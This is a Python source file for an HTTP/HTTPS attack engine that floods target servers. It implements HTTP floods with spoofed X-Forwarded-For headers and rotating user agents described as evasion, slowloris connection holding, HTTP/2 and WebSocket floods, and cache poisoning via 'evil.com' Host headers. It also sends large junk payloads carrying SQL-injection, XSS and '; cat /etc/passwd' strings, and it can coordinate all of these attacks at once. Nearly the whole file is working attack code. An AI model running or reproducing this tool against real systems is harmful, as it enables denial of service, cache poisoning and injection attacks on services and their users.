#!/usr/bin/env python3
"""
HTTP/HTTPS Attack Engine with Modern Protocol Support
Implements HTTP/1.1, HTTP/2, and HTTP/3 attack capabilities with application-layer attacks
"""

import asyncio
import aiohttp
import ssl
import socket
import random
import time
import json
import gzip
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
import websockets
from aiohttp import ClientSession, TCPConnector, ClientTimeout

@dataclass
class HTTPAttackConfig:
    """Configuration for HTTP/HTTPS attacks"""
    target: str = "127.0.0.1"
    port: int = 80
    use_ssl: bool = False
    http_version: str = "1.1"  # "1.1", "2", "3"
    max_connections: int = 1000
    request_timeout: float = 10.0
    custom_headers: Dict[str, str] = None
    custom_payload: bytes = None
    user_agents: List[str] = None
    attack_paths: List[str] = None
    websocket_enabled: bool = False
    cache_poisoning: bool = False

class HTTPPayloadGenerator:
    """Generates HTTP payloads for different attack scenarios"""
    
    DEFAULT_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    
    DEFAULT_ATTACK_PATHS = [
        "/", "/index.html", "/admin", "/login", "/api/v1/users", "/wp-admin",
        "/phpmyadmin", "/api/health", "/status", "/metrics", "/debug",
        "/config", "/backup", "/test", "/dev", "/staging"
    ]
    
    @staticmethod
    def generate_http1_request(target: str, port: int, path: str = "/", 
                              headers: Dict[str, str] = None, 
                              method: str = "GET", 
                              body: bytes = None) -> str:
        """Generate HTTP/1.1 request"""
        request_line = f"{method} {path} HTTP/1.1\r\n"
        
        default_headers = {
            "Host": f"{target}:{port}",
            "User-Agent": random.choice(HTTPPayloadGenerator.DEFAULT_USER_AGENTS),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        
        if headers:
            default_headers.update(headers)
        
        if body:
            default_headers["Content-Length"] = str(len(body))
            default_headers["Content-Type"] = "application/x-www-form-urlencoded"
        
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in default_headers.items()])
        
        request = request_line + header_lines + "\r\n\r\n"
        
        if body:
            request += body.decode('utf-8', errors='ignore')
        
        return request
    
    @staticmethod
    def generate_slowloris_headers() -> Dict[str, str]:
        """Generate headers for slowloris attack"""
        return {
            "User-Agent": random.choice(HTTPPayloadGenerator.DEFAULT_USER_AGENTS),
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Keep-Alive": "timeout=900, max=1000",
            f"X-{random.randint(1000, 9999)}": f"value-{random.randint(1000, 9999)}"
        }
    
    @staticmethod
    def generate_cache_poison_headers() -> Dict[str, str]:
        """Generate headers for cache poisoning attacks"""
        return {
            "X-Forwarded-Host": "evil.com",
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "Host": "evil.com"
        }
    
    @staticmethod
    def generate_large_payload(size: int) -> bytes:
        """Generate large payload for resource exhaustion"""
        return b"A" * size

class ModernHTTPEngine:
    """HTTP/HTTPS attack engine with modern protocol support"""
    
    def __init__(self, config: HTTPAttackConfig = None):
        self.config = config or HTTPAttackConfig()
        self.payload_gen = HTTPPayloadGenerator()
        self.active_sessions = []
        self.websocket_connections = []
        self.stats = {
            'requests_sent': 0,
            'responses_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'connections_established': 0,
            'connection_errors': 0,
            'http2_streams': 0,
            'websocket_connections': 0,
            'cache_poison_attempts': 0
        }
    
    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context for HTTPS connections"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        # Support for different HTTP versions
        if self.config.http_version == "2":
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
        elif self.config.http_version == "3":
            ctx.set_alpn_protocols(['h3', 'h2', 'http/1.1'])
        else:
            ctx.set_alpn_protocols(['http/1.1'])
        
        return ctx
    
    async def http_flood_attack(self, duration: float = 0) -> None:
        """
        HTTP flood attack with connection reuse and pipelining
        Requirements: 5.1, 5.2, 5.4
        """
        start_time = time.time()
        tasks = []
        
        # Create multiple HTTP flood workers
        num_workers = min(100, self.config.max_connections // 10)
        for _ in range(num_workers):
            task = asyncio.create_task(self._http_flood_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
            await self._cleanup_sessions()
    
    async def _http_flood_worker(self) -> None:
        """Individual HTTP flood worker"""
        connector = TCPConnector(
            limit=100,
            limit_per_host=100,
            ssl=self._create_ssl_context() if self.config.use_ssl else False,
            force_close=False,  # Enable connection reuse
            enable_cleanup_closed=True
        )
        
        timeout = ClientTimeout(total=self.config.request_timeout)
        
        async with ClientSession(connector=connector, timeout=timeout) as session:
            self.active_sessions.append(session)
            
            while True:
                try:
                    # Select random path
                    path = random.choice(self.config.attack_paths or self.payload_gen.DEFAULT_ATTACK_PATHS)
                    
                    # Build URL
                    scheme = "https" if self.config.use_ssl else "http"
                    url = f"{scheme}://{self.config.target}:{self.config.port}{path}"
                    
                    # Prepare headers
                    headers = {}
                    if self.config.custom_headers:
                        headers.update(self.config.custom_headers)
                    
                    # Add random headers for evasion
                    headers.update({
                        "User-Agent": random.choice(self.config.user_agents or self.payload_gen.DEFAULT_USER_AGENTS),
                        "X-Request-ID": f"req-{random.randint(100000, 999999)}",
                        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    })
                    
                    # Send request
                    async with session.get(url, headers=headers) as response:
                        content = await response.read()
                        
                        self.stats['requests_sent'] += 1
                        self.stats['responses_received'] += 1
                        self.stats['bytes_sent'] += len(str(headers))
                        self.stats['bytes_received'] += len(content)
                        
                        if response.version.major == 2:
                            self.stats['http2_streams'] += 1
                
                except Exception as e:
                    self.stats['connection_errors'] += 1
                
                await asyncio.sleep(0.001)  # Brief pause
    
    async def slowloris_attack(self, duration: float = 0) -> None:
        """
        Slowloris attack - slow HTTP requests
        Requirements: 5.1, 5.2, 5.4
        """
        start_time = time.time()
        tasks = []
        
        # Create slowloris workers
        for _ in range(200):
            task = asyncio.create_task(self._slowloris_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _slowloris_worker(self) -> None:
        """Individual slowloris worker"""
        try:
            # Establish connection
            if self.config.use_ssl:
                context = self._create_ssl_context()
                reader, writer = await asyncio.open_connection(
                    self.config.target, self.config.port, ssl=context
                )
            else:
                reader, writer = await asyncio.open_connection(
                    self.config.target, self.config.port
                )
            
            self.stats['connections_established'] += 1
            
            # Send initial request line
            path = random.choice(self.config.attack_paths or ["/"])
            request_line = f"GET {path} HTTP/1.1\r\n"
            writer.write(request_line.encode())
            await writer.drain()
            
            # Send host header
            host_header = f"Host: {self.config.target}\r\n"
            writer.write(host_header.encode())
            await writer.drain()
            
            # Send headers slowly
            headers = self.payload_gen.generate_slowloris_headers()
            
            for key, value in headers.items():
                header_line = f"{key}: {value}\r\n"
                writer.write(header_line.encode())
                await writer.drain()
                
                self.stats['bytes_sent'] += len(header_line)
                
                # Wait before sending next header
                await asyncio.sleep(random.uniform(10, 30))
            
        except Exception as e:
            self.stats['connection_errors'] += 1
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
    
    async def http2_specific_attack(self, duration: float = 0) -> None:
        """
        HTTP/2 specific attacks using stream multiplexing
        Requirements: 5.1, 5.2, 5.4
        """
        if self.config.http_version != "2":
            return
        
        start_time = time.time()
        tasks = []
        
        # Create HTTP/2 attack workers
        for _ in range(50):
            task = asyncio.create_task(self._http2_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _http2_worker(self) -> None:
        """HTTP/2 specific attack worker"""
        connector = TCPConnector(
            limit=50,
            ssl=self._create_ssl_context() if self.config.use_ssl else False,
            force_close=False
        )
        
        async with ClientSession(connector=connector) as session:
            while True:
                try:
                    # Create multiple concurrent requests (stream multiplexing)
                    tasks = []
                    
                    for _ in range(10):  # Multiple streams per connection
                        path = random.choice(self.config.attack_paths or self.payload_gen.DEFAULT_ATTACK_PATHS)
                        scheme = "https" if self.config.use_ssl else "http"
                        url = f"{scheme}://{self.config.target}:{self.config.port}{path}"
                        
                        # HTTP/2 specific headers
                        headers = {
                            ":method": "GET",
                            ":path": path,
                            ":scheme": scheme,
                            ":authority": f"{self.config.target}:{self.config.port}",
                            "user-agent": random.choice(self.payload_gen.DEFAULT_USER_AGENTS)
                        }
                        
                        task = asyncio.create_task(session.get(url, headers=headers))
                        tasks.append(task)
                    
                    # Execute all streams concurrently
                    responses = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for response in responses:
                        if not isinstance(response, Exception):
                            self.stats['http2_streams'] += 1
                            self.stats['requests_sent'] += 1
                            try:
                                await response.read()
                                self.stats['responses_received'] += 1
                            except:
                                pass
                
                except Exception as e:
                    self.stats['connection_errors'] += 1
                
                await asyncio.sleep(0.01)
    
    async def websocket_abuse_attack(self, duration: float = 0) -> None:
        """
        WebSocket abuse attack
        Requirements: 5.1, 5.2, 5.4
        """
        if not self.config.websocket_enabled:
            return
        
        start_time = time.time()
        tasks = []
        
        # Create WebSocket abuse workers
        for _ in range(100):
            task = asyncio.create_task(self._websocket_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _websocket_worker(self) -> None:
        """WebSocket abuse worker"""
        try:
            # WebSocket URL
            scheme = "wss" if self.config.use_ssl else "ws"
            uri = f"{scheme}://{self.config.target}:{self.config.port}/ws"
            
            # Connect to WebSocket
            async with websockets.connect(uri, ssl=self._create_ssl_context() if self.config.use_ssl else None) as websocket:
                self.websocket_connections.append(websocket)
                self.stats['websocket_connections'] += 1
                
                # Send rapid messages
                while True:
                    message = json.dumps({
                        "type": "message",
                        "data": "x" * random.randint(100, 1000),
                        "timestamp": time.time()
                    })
                    
                    await websocket.send(message)
                    self.stats['requests_sent'] += 1
                    self.stats['bytes_sent'] += len(message)
                    
                    await asyncio.sleep(0.001)
        
        except Exception as e:
            self.stats['connection_errors'] += 1
    
    async def cache_poisoning_attack(self, duration: float = 0) -> None:
        """
        Cache poisoning attack using header manipulation
        Requirements: 5.1, 5.2, 5.4
        """
        if not self.config.cache_poisoning:
            return
        
        start_time = time.time()
        
        connector = TCPConnector(
            limit=50,
            ssl=self._create_ssl_context() if self.config.use_ssl else False
        )
        
        async with ClientSession(connector=connector) as session:
            while duration == 0 or (time.time() - start_time) < duration:
                try:
                    # Generate cache poisoning headers
                    poison_headers = self.payload_gen.generate_cache_poison_headers()
                    
                    # Add random cache-busting parameters
                    cache_buster = f"cb={random.randint(100000, 999999)}"
                    
                    path = random.choice(self.config.attack_paths or ["/"])
                    scheme = "https" if self.config.use_ssl else "http"
                    url = f"{scheme}://{self.config.target}:{self.config.port}{path}?{cache_buster}"
                    
                    async with session.get(url, headers=poison_headers) as response:
                        await response.read()
                        
                        self.stats['cache_poison_attempts'] += 1
                        self.stats['requests_sent'] += 1
                        self.stats['bytes_sent'] += len(str(poison_headers))
                
                except Exception as e:
                    self.stats['connection_errors'] += 1
                
                await asyncio.sleep(0.1)
    
    async def application_layer_attack(self, duration: float = 0) -> None:
        """
        Application-layer attacks with custom payload injection
        Requirements: 5.1, 5.2, 5.4
        """
        start_time = time.time()
        
        connector = TCPConnector(
            limit=100,
            ssl=self._create_ssl_context() if self.config.use_ssl else False
        )
        
        async with ClientSession(connector=connector) as session:
            while duration == 0 or (time.time() - start_time) < duration:
                try:
                    # Select attack method
                    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
                    method = random.choice(methods)
                    
                    path = random.choice(self.config.attack_paths or self.payload_gen.DEFAULT_ATTACK_PATHS)
                    scheme = "https" if self.config.use_ssl else "http"
                    url = f"{scheme}://{self.config.target}:{self.config.port}{path}"
                    
                    # Prepare payload
                    data = None
                    if method in ["POST", "PUT", "PATCH"]:
                        if self.config.custom_payload:
                            data = self.config.custom_payload
                        else:
                            # Generate large payload for resource exhaustion
                            payload_size = random.randint(1024, 10240)
                            data = self.payload_gen.generate_large_payload(payload_size)
                    
                    # Headers with potential injection attempts
                    headers = {
                        "User-Agent": random.choice(self.payload_gen.DEFAULT_USER_AGENTS),
                        "Content-Type": "application/json" if method in ["POST", "PUT", "PATCH"] else None,
                        "X-Injection-Test": "'; DROP TABLE users; --",
                        "X-XSS-Test": "<script>alert('xss')</script>",
                        "X-Command-Injection": "; cat /etc/passwd"
                    }
                    
                    # Remove None values
                    headers = {k: v for k, v in headers.items() if v is not None}
                    
                    async with session.request(method, url, headers=headers, data=data) as response:
                        content = await response.read()
                        
                        self.stats['requests_sent'] += 1
                        self.stats['responses_received'] += 1
                        self.stats['bytes_sent'] += len(data) if data else 0
                        self.stats['bytes_received'] += len(content)
                
                except Exception as e:
                    self.stats['connection_errors'] += 1
                
                await asyncio.sleep(0.01)
    
    async def _cleanup_sessions(self) -> None:
        """Clean up active sessions"""
        for session in self.active_sessions:
            try:
                await session.close()
            except:
                pass
        self.active_sessions.clear()
        
        for ws in self.websocket_connections:
            try:
                await ws.close()
            except:
                pass
        self.websocket_connections.clear()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return self.stats.copy()
    
    async def coordinated_http_attack(self, attack_types: List[str], duration: float = 0) -> None:
        """
        Coordinate multiple HTTP attack types simultaneously
        Requirements: 5.1, 5.2, 5.4
        """
        tasks = []
        
        if "flood" in attack_types:
            tasks.append(asyncio.create_task(self.http_flood_attack(duration)))
        
        if "slowloris" in attack_types:
            tasks.append(asyncio.create_task(self.slowloris_attack(duration)))
        
        if "http2" in attack_types and self.config.http_version == "2":
            tasks.append(asyncio.create_task(self.http2_specific_attack(duration)))
        
        if "websocket" in attack_types and self.config.websocket_enabled:
            tasks.append(asyncio.create_task(self.websocket_abuse_attack(duration)))
        
        if "cache_poison" in attack_types and self.config.cache_poisoning:
            tasks.append(asyncio.create_task(self.cache_poisoning_attack(duration)))
        
        if "application_layer" in attack_types:
            tasks.append(asyncio.create_task(self.application_layer_attack(duration)))
        
        try:
            await asyncio.gather(*tasks)
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()
            await self._cleanup_sessions()